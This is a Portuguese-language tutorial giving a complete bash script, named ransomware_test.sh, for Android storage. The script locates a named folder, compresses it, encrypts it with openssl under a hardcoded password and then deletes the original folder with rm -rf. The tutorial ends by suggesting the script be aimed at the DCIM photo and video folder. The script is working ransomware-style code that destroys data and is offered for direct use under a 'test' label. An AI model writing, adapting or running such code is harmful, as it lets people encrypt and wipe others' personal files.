Script para Localizar Pasta Visível ou Oculta e Executar o Processo

1. Abra o arquivo no nano:

nano ransomware_test.sh


2. Substitua o conteúdo com o seguinte código:
_____________________________
#!/bin/bash

# Nomes possíveis da pasta (visível ou oculta)
VISIBLE_FOLDER="teste"
HIDDEN_FOLDER=".teste"

# Usar o comando find para procurar a pasta visível ou oculta no sistema
VISIBLE_TARGET=$(find /storage/emulated/0 -type d -name "$VISIBLE_FOLDER" 2>/dev/null)
HIDDEN_TARGET=$(find /storage/emulated/0 -type d -name "$HIDDEN_FOLDER" 2>/dev/null)

# Verifica qual das pastas foi encontrada
if [ -n "$VISIBLE_TARGET" ]; then
    TARGET_FOLDER="$VISIBLE_TARGET"
    echo "Pasta visível encontrada em: $TARGET_FOLDER"
elif [ -n "$HIDDEN_TARGET" ]; then
    TARGET_FOLDER="$HIDDEN_TARGET"
    echo "Pasta oculta encontrada em: $TARGET_FOLDER"
else
    echo "Nenhuma pasta 'teste' ou '.teste' encontrada!"
    exit 1
fi

# Nome do arquivo .tar.gz
ARCHIVE_PATH="/storage/emulated/0/$(basename "$TARGET_FOLDER").tar.gz"

# Compactar a pasta encontrada
tar -czf "$ARCHIVE_PATH" -C "$(dirname "$TARGET_FOLDER")" "$(basename "$TARGET_FOLDER")"

# Verifica se o arquivo .tar.gz foi criado com sucesso
if [ ! -f "$ARCHIVE_PATH" ]; then
    echo "Erro ao compactar a pasta $TARGET_FOLDER"
    exit 1
fi

# Criptografar o arquivo .tar.gz
openssl enc -aes-256-cbc -salt -in "$ARCHIVE_PATH" -out "$ARCHIVE_PATH.enc" -k "@kali24"

# Verifica se a criptografia foi bem-sucedida
if [ $? -eq 0 ]; then
    # Apaga o arquivo compactado original após criptografar
    rm "$ARCHIVE_PATH"
    echo "Pasta $TARGET_FOLDER criptografada com sucesso!"

    # Deletar a pasta original e seu conteúdo
    rm -rf "$TARGET_FOLDER"
    if [ $? -eq 0 ]; then
        echo "Pasta original $TARGET_FOLDER deletada com sucesso!"
    else
        echo "Erro ao deletar a pasta $TARGET_FOLDER!"
    fi
else
    echo "Erro ao criptografar a pasta $TARGET_FOLDER"
fi
-----------------------------
3. Salve e saia do nano:

Pressione CTRL + O para salvar.

Pressione CTRL + X para sair.



4. Dê permissão de execução ao script (se necessário):

chmod +x ransomware_test.sh


5. Execute o script:

./ransomware_test.sh



Explicação:

O script tenta encontrar primeiro a pasta visível teste e, caso ela não exista, tenta localizar a pasta oculta .teste.

Se uma das pastas for encontrada, o processo de compactação, criptografia e exclusão será realizado.

Se nenhuma pasta for encontrada, o script exibirá uma mensagem de erro e encerrará.


Teste:

Crie duas pastas (uma visível e uma oculta) e execute o script para ver se ele lida corretamente com ambas as situações.

O script deve localizar a pasta, compactá-la, criptografá-la e, em seguida, deletar a pasta original, seja ela visível ou oculta.

Você pode mudar o nome da pasta,como escolher a pasta DCIM,que é a pasta padrão para armazenamento de fotos e vídeos em dispositivos Android.